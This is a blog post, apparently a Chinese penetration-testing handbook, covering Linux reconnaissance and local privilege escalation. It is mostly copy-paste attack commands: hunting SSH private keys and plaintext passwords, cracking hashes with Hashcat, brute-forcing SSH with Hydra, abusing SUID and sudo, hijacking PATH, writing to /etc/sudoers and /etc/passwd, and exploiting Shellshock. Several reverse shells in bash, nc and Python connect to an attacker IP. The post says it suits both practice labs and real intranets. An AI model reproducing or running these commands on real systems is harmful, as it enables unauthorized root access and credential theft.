---
title: Linux内网信息收集与本地提权全流程手册
date: 2026-07-15 10:00:00 +0800
categories: [经验分享]
tags: [Linux, 内网渗透, 提权, 信息收集]
---

本文为独立 Linux 内网渗透专项手册，涵盖**系统信息收集、用户/环境/进程/日志枚举、密码爆破、SSH私钥挖掘、SUID提权、PATH环境变量劫持、Sudo提权、计划任务提权、内核漏洞、rbash逃逸、共享库注入、Capability权限提权**全套实战命令，适配靶场及真实内网渗透场景。

## 一、Linux 基础系统信息收集

### 1\. 内核版本探测（内核提权前置）

```Plain Text
# 查看完整内核、系统架构信息
uname -a

# 查看系统内核详细版本
cat /proc/version
```

### 2\. 自动内核漏洞探针

工具：**linux\-exploit\-suggester**，自动匹配内核版本可利用本地提权漏洞

### 3\. 用户与权限枚举

```Plain Text
# 筛选home目录下拥有bash登录权限的用户
cat /etc/passwd | grep home | grep bash

# 查看其他用户家目录，寻找备份文件、密钥、配置文件
cd /home; ls -al
```

### 4\. 环境变量与历史命令抓取

```Plain Text
# 查看系统全部环境变量（可能泄露路径、密钥、代理、账号信息）
env
set

# 查看当前用户历史命令（高频泄露密码、路径、数据库信息）
history
```

## 二、密码哈希爆破（Hashcat）

适用于抓取 Linux shadow 哈希后，本地离线暴力破解

```Plain Text
# 1. 纯数字 1~8位 递增爆破（自动启停）
hashcat -m 1800 哈希值 -a 3 -i --increment-min 1 --increment-max 8 ?d?d?d?d?d?d?d?d

# 2. 数字+小写字母 1~6位 递增爆破
hashcat -m 1800 哈希值 -a 3 -i --increment-min 1 --increment-max 6 ?h?h?h?h?h?h
```

## 三、进程、服务、计划任务枚举

```Plain Text
# 查看系统全部进程、运行服务、可疑后台程序
ps aux

# 查看系统预设服务端口与配置
cat /etc/services

# 查看当前用户计划任务（定时任务提权核心）
crontab -l

# 查看系统全局计划任务
cat /etc/crontab
```

## 四、SSH私钥探测与利用（无密码登录）

原理：抓取各用户私钥 id\_rsa，本地修改权限 600 即可免密登录对应账号

```Plain Text
# 遍历所有用户目录，查找SSH私钥（排除公钥）
find /home /root -name "id_*" -path "*/.ssh/*" -not -name "*.pub" -ls 2>/dev/null

# 查看私钥权限（必须600才可使用，否则SSH拒绝登录）
find /home /root -name "id_*" -path "*/.ssh/*" -not -name "*.pub" -exec ls -l {} \; 2>/dev/null
```

## 五、系统明文密码检索

```Plain Text
# 全局检索6位以上大小写+数字组合明文密码（排除系统临时目录）
grep -rn ".*[0-9a-zA-Z]{6,}" /etc /home /root --exclude-dir={proc,sys,dev,tmp} 2>/dev/null

# 全局检索含pass关键词的配置文件、明文密码
grep -R -i pass /home/* 2>/dev/null
```

技巧：数据库密码、系统用户密码大概率复用，可直接**密码喷洒**横向爆破SSH、数据库服务。

## 六、网站/备份文件探测 \+ SSH爆破

重点扫描网站根目录、home目录下 `.bak/.zip/.tar/.sql/.conf` 备份文件，大概率泄露账号密码

拿到密码字典后使用 Hydra 批量爆破 SSH：

```Plain Text
hydra -L 用户字典.txt -P 密码字典.txt 目标IP ssh
```

## 七、日志信息排查（溯源 \& 信息挖掘）

```Plain Text
# 系统全局日志
/var/log

# Apache 网页日志
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log

# Nginx 网页日志
cat /var/log/nginx/access.log
cat /var/log/nginx/error.log
```

---

## 八、Linux 高频本地提权方法（核心）

### 1\. SUID 权限漏洞提权

原理：root所属文件被错误配置SUID\(4000\)权限，普通用户执行可提升至root权限

```Plain Text
# 查找所有root用户、带SUID权限的程序
find / -user root -perm -4000 -print 2>/dev/null

# 查看指定文件读写权限
ls -la /var/www/backup/procwatch
```

#### 常见可利用SUID程序逃逸Payload

```Plain Text
# 1. tmp目录执行逃逸
find /tmp -exec /bin/sh -p \; -quit

# 2. vim/vim.tiny 提权
vim -c ':!/bin/bash'
vim.tiny /etc/passwd

# 3. vi 编辑器提权
vi /xxx
# 普通模式输入
:shell

# 4. less 命令提权
less /etc/passwd
# 输入 ! 后执行bash
!bash

# 5. gcc sudo 提权
sudo gcc -wrapper /bin/sh,-s .

# 6. systemctl 提权（写入恶意服务反弹shell）
# 7. 自定义PATH劫持提权（tmp目录伪造系统命令）
```

陌生SUID程序利用：`searchsploit 程序名`，可下载EXP本地编译利用。

### 2\. PATH 环境变量劫持提权

原理：程序调用系统命令（ps/sh/tail等）未写绝对路径，可伪造同名恶意程序，劫持执行root权限命令

```Plain Text
# 方式1：伪造ps劫持
ln -s /bin/sh ps
export PATH=.:$PATH
# 运行原二进制程序，触发sh提权

# 方式2：前置tmp目录优先级
export PATH=/tmp:$PATH

# 方式3：伪造tail反弹shell
touch tail
echo 'bash -c "bash -i >& /dev/tcp/192.168.79.130/7777 0>&1"' > tail
chmod +x tail
export PATH=.:$PATH
# 执行依赖tail的sudo脚本
sudo --preserve-env=PATH /usr/bin/check_syslog.sh
```

### 3\. Sudo 权限滥用提权（最全合集）

```Plain Text
# 查看当前用户所有sudo免密权限
sudo -l

# 直接切换root
sudo su
```

#### 3\.1 可写文件枚举

```Plain Text
# 全局查找777权限可写文件
find / -perm 0777 -type f 2>/dev/null

# 全局查找用户可写文件（排除系统目录）
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | grep -v var
```

#### 3\.2 Git 提权

```Plain Text
sudo git help config
# 输入 !/bin/bash 逃逸交互Shell
!/bin/bash
```

#### 3\.3 指定低权限用户执行恶意脚本

```Plain Text
echo '/bin/bash' >> backups.sh
sudo -u jens ./backups.sh
```

#### 3\.4 Teehee 写入sudoers提权（万能提权）

```Plain Text
# 赋予当前用户全部sudo权限无密码
echo 'charles ALL=(ALL:ALL) NOPASSWD:ALL' | sudo teehee -a /etc/sudoers
```

#### 3\.5 Nmap NSE脚本提权

```Plain Text
echo 'os.execute("/bin/sh")' > getshell.nse
sudo nmap --script=getshell.nse
```

#### 3\.6 自定义系统用户（passwd写入）

```Plain Text
# 生成自定义密码哈希
openssl passwd 123456

# 写入/etc/passwd 创建root权限用户
ali:bwfgXppOVV0PI:0:0::/root:/bin/bash
```

#### 3\.7 Mv 命令劫持提权

```Plain Text
sudo mv /bin/tar /bin/tar.orgi
sudo mv /bin/su /bin/tar
# 执行tar触发su权限
sudo tar
```

#### 3\.8 Perl / grc 提权

```Plain Text
# Perl反弹bash
sudo perl -e 'exec "/bin/bash";'

# grc提权
sudo grc --pty /bin/sh
```

### 4\. 内核漏洞提权

代表漏洞：脏牛（Dirty COW），适用于低版本Linux内核

```Plain Text
# 查看内核版本
uname -a

# 搜索对应内核本地提权EXP
searchsploit 2.6.3 Local

# 优先测试 .c / .sh 格式提权脚本
```

### 5\. 计划任务漏洞提权

原理：root定时任务调用可编辑脚本/文件，低权限用户写入反弹Shell，等待定时执行

```Plain Text
# 查看定时任务
cat /etc/crontab

# Bash反弹Shell写入任务文件
echo "bash -c 'bash -i >& /dev/tcp/192.168.79.133/7777 0>&1'" >> 10-help-text

# NC反弹Shell
echo 'nc -e /bin/bash 192.168.79.133 7777' >> write.sh

# 攻击机监听
nc -lvp 7777
```

#### Python定时任务反弹Shell

```Plain Text
#!/usr/bin/env python
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.79.133",7777))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
```

### 6\. rbash 受限Shell逃逸

```Plain Text
# 查看当前环境变量
echo $PATH

# 查看可用命令
ls /home/mindy/bin

# 查看隐藏逃逸文件
ls -a

# BASH_CMDS 后门逃逸
BASH_CMDS[su]=/bin/sh
su

# 补全系统命令路径
export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin/
su jerry
```

#### sshpass 免密登录逃逸

```Plain Text
# 首次登录后可免密交互
sshpass -p 'P@55W0rd1!2@' ssh mindy@192.168.79.176 -t bash
```

### 7\. Shellshock 破壳漏洞

适用版本：Bash \< 4\.3

```Plain Text
# 查看bash版本
bash --version

# 漏洞检测
Env x='() { :; };echo vulnerable' bash -c data

# 漏洞利用写入sudoers提权
Env x='() { :; }; echo /bin/echo "user ALL=(ALL)ALL" >> /etc/sudoers'
```

### 8\. SO 共享库注入提权

原理：程序加载自定义动态链接库，可写目录覆盖so文件实现代码执行

```Plain Text
# 编译恶意so共享库
gcc -shared -fPIC -o demo.so demo.c -nostartfiles

# 执行依赖该so的程序，触发提权代码
/script/demo
```

### 9\. Capabilities 权限机制提权

```Plain Text
# 扫描系统特殊Capability权限
getcap -r / 2>/dev/null

# 拥有setuid权限时直接提权root
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

## 手册总结

1\. Linux渗透流程：**信息枚举 → 密钥/密码抓取 → 漏洞探针 → 权限错位利用 → 提权落地**；

2\. 内网Linux机器最高频突破口：**SUID错位、Sudo免密权限、PATH劫持、计划任务可写、SSH私钥泄露**；

3\. 低版本内核优先尝试脏牛等内核EXP，受限Shell优先环境变量逃逸、命令劫持；

4\. 所有提权思路均可组合使用，先自动化探针，再人工针对性复核利用。

> （注：部分内容可能由 AI 生成）
